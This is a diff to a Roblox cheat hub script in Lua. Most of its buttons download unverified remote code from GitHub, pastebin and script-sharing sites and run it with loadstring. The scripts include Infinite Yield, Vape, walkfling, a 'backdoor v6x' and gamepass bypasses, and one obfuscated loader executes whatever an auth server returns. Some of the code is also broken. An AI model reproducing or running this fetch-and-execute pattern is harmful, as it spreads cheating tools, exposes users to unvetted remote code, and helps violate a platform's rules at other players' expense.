@@ -59,7 +59,8 @@ local Section = Tab:CreateSection("GLOBAL!!!! (REQUIRE FOR PHONES)")
 
 local Button = Tab:CreateButton({
     Name = "BUTTON",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    -- Создаем ScreenGui
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
@@ -103,6 +104,7 @@ end
 
 -- Позволяем двигать кнопку
 button Draggable = true
+       end
     end,
 })
 
@@ -116,7 +118,8 @@ Name = <string> - The name of the section.
 
 local Button = Tab:CreateButton({
     Name = "GhAzor.lua",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    --[[
 	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
 ]]
@@ -133,6 +136,7 @@ loadstring(game:HttpGet(("https://raw.githubusercontent.com/WebsMoment/Azor.lua/
 
 local Button = Tab:CreateButton({
    Name = "sc3-var (private script)",
+   Interact = 'Click',
    Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Minecraftfornikka/Sc3-var/refs/heads/main/Sc3-var"))()
    end,
@@ -141,6 +145,7 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
    Name = "plsnoleak",
+   Interact = 'Click',
    Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/UltraDemonLord/PlsNoLeak/f95cfcbf5d65fd80a217df708842e89f67e71810/PlsNoLeak'))()
    end,
@@ -149,7 +154,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "kohlslite",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/S-PScripts/kohlslite/refs/heads/main/source.lua"))()
     end,    
 })
@@ -157,7 +163,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "solinium v2",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Kohls-Admin-House-NBC-Updated-Solinium-V2-23937"))()
     end,
 })
@@ -165,7 +172,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "solinium v2 (player list)",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Kohls-Admin-House-NBC-Updated-Solinium-GamePass-Playerlist-24764"))()
     end,
 })
@@ -173,7 +181,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "shift v1.2",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/dredlar/Shift-V1/refs/heads/main/Shift_V1.2_jk.txt'))()
     end,
 })
@@ -188,7 +197,8 @@ Name = <string> - The name of the section.
 
 local Button = Tab:CreateButton({
     Name = "vape v4",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Vape-V4-For-Roblox_316"))()
     end,
 })
@@ -196,7 +206,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "aura mine (BROKE!!)",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    local player = game.Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
@@ -231,7 +242,8 @@ end
 
 local Button = Tab:CreateButton({
     Name = "infinite Yield",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
     end,    
 })
@@ -239,7 +251,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "skywars",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/RedZenXYZ/4d80bfd70ee27000660e4bfa7509c667/raw/da903c570249ab3c0c1a74f3467260972c3d87e6/KeyBoard%2520From%2520Ohio%2520Fr%2520Fr"))()
    
    loadstring(game:HttpGet("https://paste.ee/r/r9gnA", true))()
@@ -249,7 +262,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "autoclicker",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    local player = game:GetService("Players").LocalPlayer
 game:GetService("RunService").RenderStepped:Connect(function()
     local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
@@ -263,7 +277,8 @@ end)
 
 local Button = Tab:CreateButton({
     Name = "autoclicker v2",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    local player = game:GetService("Players").LocalPlayer
 
 spawn(function()
@@ -282,7 +297,8 @@ end)
 
 local Button = Tab:CreateButton({
     Name = "jump range",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    local InfiniteJumpEnabled = true
 game:GetService("UserInputService").JumpRequest:connect(function()
 	if InfiniteJumpEnabled then
@@ -325,7 +341,8 @@ end)
 
 local Button = Tab:CreateButton({
     Name = "voidware (FILES REQUIRED)",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadfile("vape/loadstring")
     end,    
 })
@@ -336,7 +353,8 @@ local Section = Tab:CreateSection("murder mystery")
 
 local Button = Tab:CreateButton({
     Name = "eclipse hub",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    getgenv().mainKey = "nil"
 
 local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
@@ -346,7 +364,8 @@ local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or
 
 local Button = Tab:CreateButton({
     Name = "x hub (for mobile maybe)",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
     end,    
 })
@@ -357,7 +376,8 @@ local Section = Tab:CreateSection("prison life")
 
 local Button = Tab:CreateButton({
     Name = "prizz",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Prison-Life-Prizz-25328"))()
     end,    
 })
@@ -365,7 +385,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "flycar",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Car-fly-GUI-for-mobile-7321"))()
     end,    
 })
@@ -376,7 +397,8 @@ local Section = Tab:CreateSection("doors")
 
 local Button = Tab:CreateButton({
     Name = "blackking (fly)",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/FLOOR-2-DOORS-Blackking-Rework-Is-Back-Floor-2-Only-No-Key-17914"))()
 
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FlyGui-7844"))()
@@ -389,14 +411,16 @@ local Section = Tab:CreateSection("breaking point")
 
 local Button = Tab:CreateButton({
     Name = "breaking+",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Breaking-Point-plus-12451"))()
     end,    
 })
 
 local Button = Tab:CreateButton({
     Name = "breaking top script",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/H4R7N/lua/refs/heads/main/Breaking%20Point%20H4R7N%20Hack%20v1.2.lua'))()
 
     end,    
@@ -409,7 +433,8 @@ local Section = Tab:CreateSection("Muscle legends")
 
 local Button = Tab:CreateButton({
     Name = "speed hub x",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Blox-Fruits-Speed-Hub-X-24115"))()
     end,    
 })
@@ -420,7 +445,8 @@ local Section = Tab:CreateSection("Muscle simulator")
 
 local Button = Tab:CreateButton({
     Name = "backdoor v6x",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/PXAdj6ED"))();
     end,    
 })
@@ -428,7 +454,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "muscle simulator",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Minecraftfornikka/Muscle-simulator/refs/heads/main/Muscle'))()
     end,    
 })
@@ -436,7 +463,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "drop tools",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Drop-tools_291"))()
     end,    
 })
@@ -447,7 +475,8 @@ local Section = Tab:CreateSection("universal")
 
 local Button = Tab:CreateButton({
     Name = "no cooldown",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-no-cooldown-6517"))()
     end,    
 })
@@ -455,7 +484,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "Acrylix",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Acrylix-or-A-Cheat-for-Sans-Multiversal-Battles-2-4074"))()
     end,    
 })
@@ -463,7 +493,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "sirius",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Sirius-7420"))()
     end,    
 })
@@ -471,7 +502,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "op autoclicker",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-OP-autoclicker-21838"))()
     end,    
 })
@@ -479,7 +511,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "walkfling",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-WalkFling-22254"))()
     end,    
 })
@@ -487,7 +520,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "VX hub",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Murderers-VS-Sheriffs-Duels-VX-HUB-22119"))()
     end,    
 })
@@ -495,7 +529,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "gamepasses",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/BaconBossScript/Crazy/main/Crazy'),true))()
     end,    
 })
@@ -503,7 +538,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "animations",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet('https://pastefy.app/S7xNJSXX/raw'))()execute("Script9")
     end,    
 })
@@ -511,7 +547,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "solara hub",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Solara-Hub-Keyless-195-Games-20988"))()
     end,    
 })
@@ -522,7 +559,8 @@ local Section = Tab:CreateSection("18+")
 
 local Button = Tab:CreateButton({
     Name = "1 script (maybe work)",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/blackheartedcurse/punkz-Scripts/main/SolaraVersionRagdoll.lua"))()
     end,    
 })
@@ -530,7 +568,8 @@ local Button = Tab:CreateButton({
 
 local Button = Tab:CreateButton({
     Name = "2 script",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/38Jra00x"))()
     end,    
 })
@@ -541,7 +580,8 @@ local Tab = Window:CreateTab("Settings", 4483362458) -- Title, Image
 
 local Button = Tab:CreateButton({
     Name = "close its script",
-    Callback = function()
+    Interact = 'Click',
+   Callback = function()
    Rayfield:Destroy()
     end,    
 })
